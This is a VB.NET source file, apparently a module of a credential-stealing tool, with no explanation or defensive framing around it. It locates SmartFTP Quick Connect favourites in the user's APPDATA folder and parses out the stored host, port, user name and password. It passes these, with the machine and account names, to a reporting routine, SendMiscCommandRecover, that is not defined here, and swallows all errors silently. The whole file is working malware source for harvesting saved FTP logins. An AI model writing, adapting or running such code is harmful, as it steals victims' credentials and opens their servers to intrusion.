Option Strict Off
Imports Microsoft.VisualBasic

Module SmartFTP
    Sub SmartFTP()
        Dim sPath As String = Environ$("APPDATA") & "\SmartFTP\Client 2.0\Favorites\Quick Connect\" & Dir(Environ$("APPDATA") & "\SmartFTP\Client 2.0\Favorites\Quick Connect\*.xml")
        Dim sFile As String = ReadFile(sPath)
        Dim sHost As String = Cut(sFile, "<Host>", "</Host>")
        Dim sPort As String = Cut(sFile, "<Port>", "</Port>")
        Dim sUser As String = Cut(sFile, "<User>", "</User>")
        Dim sPwd As String = Cut(sFile, "<Password>", "</Password>")
        Dim sEntry As String = Cut(sFile, "<Name>", "</Name>")

        Try
            Dim nl As String = vbNewLine
            If Not sEntry = Nothing Then
                SendMiscCommandRecover(Environment.MachineName & "/" & Environment.UserName & "|" & sHost & ":" & sPort & "|" & sUser & "|" & sPwd & "|" & 0 & "|[SmartFTP]")
            Else
            End If

        Catch ex As Exception
        End Try

    End Sub
    Function ReadFile(ByVal sFile As String) As String
        On Error Resume Next
        Dim OpenFile As New System.IO.StreamReader(sFile)
        ReadFile = OpenFile.ReadToEnd.ToString
    End Function

    Function Cut(ByVal sInhalt As String, ByVal sText As String, ByVal stext2 As String) As String
        On Error Resume Next
        Dim c() As String
        Dim c2() As String
        c = Split(sInhalt, sText)
        c2 = Split(c(1), stext2)
        Cut = c2(0)
    End Function

End Module